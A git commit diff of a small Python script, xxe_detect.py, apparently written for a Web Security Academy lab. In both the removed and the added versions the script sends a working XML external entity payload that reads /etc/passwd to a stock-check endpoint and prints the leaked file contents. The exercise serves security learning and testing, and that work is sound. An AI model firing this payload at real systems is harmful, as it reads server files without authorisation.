9a7a69aa805a1cda5d09e3e8aeee15c5eb10cb8e
DanielaCe18 <cedaniela613@gmail.com>
2024-06-25 14:29:39 +0200

    corection xxe_detect.py

--- Scanner des Vulnerabilites/xxe_detect.py
+++ Scanner des Vulnerabilites/xxe_detect.py
@@ -1,30 +1,28 @@
 import requests
 
-def check_xxe_vulnerability(url):
-    # The XML payload attempting to define and use an external entity to read /etc/passwd
-    xml_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
-    <!DOCTYPE foo [
-    <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-    <stockCheck><productId>&xxe;</productId></stockCheck>"""
+# The URL of the lab's "Check stock" feature
+lab_url = "https://0a7e0060042e0c2581ae43a200ea00b1.web-security-academy.net/product/stock"
 
-    headers = {
-        'Content-Type': 'application/xml'  # Assuming XML is expected by the server
-    }
+# The XXE payload
+xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+    <productId>&xxe;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+"""
 
-    try:
-        # Sending the crafted XML payload to the server
-        response = requests.post(url, data=xml_payload, headers=headers, timeout=10)
-        
-        # Check if the response contains any part of the /etc/passwd file
-        if "root:x:" in response.text:
-            print("Vulnerable to XXE! /etc/passwd contents found in the response.")
-        else:
-            print("No obvious vulnerability found.")
-    except requests.exceptions.RequestException as e:
-        print(f"Error making request: {e}")
+# The headers for the request
+headers = {
+    "Content-Type": "application/xml"
+}
 
-# Replace with the URL where you are supposed to send the XML data
-url = "https://0a100079035dc02d83d764a9005d000a.web-security-academy.net/product/stock"
+# Send the POST request with the XXE payload
+response = requests.post(lab_url, data=xxe_payload, headers=headers)
 
-check_xxe_vulnerability(url)
+# Check if the response contains the contents of /etc/passwd
+if "/bin/bash" in response.text or "root:x:" in response.text:
+    print("The application is vulnerable to XXE. /etc/passwd contents found in the response:")
+    print(response.text)
+else:
+    print("The application is not vulnerable to XXE or the payload did not succeed.")
